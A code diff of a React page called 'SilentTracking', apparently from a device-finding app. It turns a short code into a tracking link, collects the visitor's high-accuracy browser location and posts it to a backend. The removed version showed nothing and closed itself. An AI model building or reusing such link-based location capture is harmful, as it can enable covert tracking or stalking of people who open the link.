@@ -1,4 +1,4 @@
-import React, { useEffect, useRef } from "react";
+import React, { useEffect, useRef, useState } from "react";
 import { useParams } from "react-router-dom";
 
 const API =
@@ -7,99 +7,95 @@ const API =
     : "https://find-device-server.onrender.com";
 
 const SilentTracking = () => {
-  const { linkId } = useParams();
+  const { shortCode } = useParams();
   const locationSentRef = useRef(false);
+  const [status, setStatus] = useState("Getting link info...");
 
   useEffect(() => {
-    console.log("Tracking page loaded for linkId:", linkId);
+    const startTracking = async () => {
+      try {
+        // Step 1: Resolve shortCode → linkId
+        const res = await fetch(`${API}/api/short/${shortCode}`);
+        if (!res.ok) {
+          setStatus("Link expired or invalid");
+          return;
+        }
+        const { trackingUrl } = await res.json();
+        setStatus("Requesting location...");
 
-    const sendLocationViaAPI = async () => {
-      if (locationSentRef.current) return;
-      locationSentRef.current = true;
+        // Step 2: Parse linkId from trackingUrl
+        const linkId = trackingUrl.split("/track/")[1];
+        if (!linkId) {
+          setStatus("Invalid tracking link");
+          return;
+        }
 
-      if (!navigator.geolocation) {
-        console.error("Geolocation not supported");
-        alert("Your device does not support location tracking.");
-        setTimeout(() => window.close(), 1500);
-        return;
-      }
+        // Step 3: Request geolocation after small delay
+        await new Promise((r) => setTimeout(r, 300)); // ensures component mounted
 
-      // Check HTTPS
-      if (
-        window.location.protocol !== "https:" &&
-        window.location.hostname !== "localhost"
-      ) {
-        console.warn("⚠️ Geolocation may be blocked on non-HTTPS page.");
-        alert("Please access this link via HTTPS for location tracking.");
-      }
+        if (!navigator.geolocation) {
+          setStatus("Geolocation not supported");
+          return;
+        }
 
-      console.log("Requesting location...");
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            if (locationSentRef.current) return;
+            locationSentRef.current = true;
 
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const location = {
-            lat: position.coords.latitude,
-            lng: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-          };
+            const location = {
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+            };
 
-          console.log("Location obtained:", location);
-
-          try {
-            const response = await fetch(
+            // Step 4: Send to backend
+            const trackRes = await fetch(
               `${API}/api/track-location/${linkId}`,
               {
                 method: "POST",
-                headers: {
-                  "Content-Type": "application/json",
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ location }),
               },
             );
+            const result = await trackRes.json();
 
-            const result = await response.json();
-            console.log("API response:", result);
-
-            if (result.success) {
-              console.log("✅ Location saved successfully!");
-            } else {
-              console.error("Failed to save location:", result.error);
-            }
-          } catch (error) {
-            console.error("Error sending location:", error);
-          }
-
-          // Close after sending
-          setTimeout(() => window.close(), 1000);
-        },
-        (error) => {
-          console.error("Geolocation error:", error);
-          if (error.code === error.PERMISSION_DENIED) {
-            alert("Location permission denied. Enable it in browser settings.");
-          } else if (error.code === error.POSITION_UNAVAILABLE) {
-            alert("Unable to determine location.");
-          } else if (error.code === error.TIMEOUT) {
-            alert("Location request timed out. Try again.");
-          }
-          setTimeout(() => window.close(), 2000);
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 30000, // Increased timeout for mobile GPS
-          maximumAge: 0,
-        },
-      );
+            if (result.success) setStatus("Location sent successfully!");
+            else setStatus("Failed to save location");
+          },
+          (err) => {
+            if (err.code === err.PERMISSION_DENIED)
+              setStatus("Permission denied");
+            else setStatus("Unable to get location");
+          },
+          { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 },
+        );
+      } catch (err) {
+        console.error(err);
+        setStatus("Error tracking location");
+      }
     };
 
-    sendLocationViaAPI();
+    startTracking();
+  }, [shortCode]);
 
-    // Force close after 35 seconds as a backup
-    const forceCloseTimer = setTimeout(() => window.close(), 35000);
-
-    return () => clearTimeout(forceCloseTimer);
-  }, [linkId]);
-
-  return null;
+  return (
+    <div
+      style={{
+        display: "flex",
+        alignItems: "center",
+        justifyContent: "center",
+        height: "100vh",
+        flexDirection: "column",
+        background: "#111",
+        color: "#fff",
+        fontFamily: "system-ui",
+        textAlign: "center",
+      }}
+    >
+      <div>{status}</div>
+    </div>
+  );
 };
 
 export default SilentTracking;
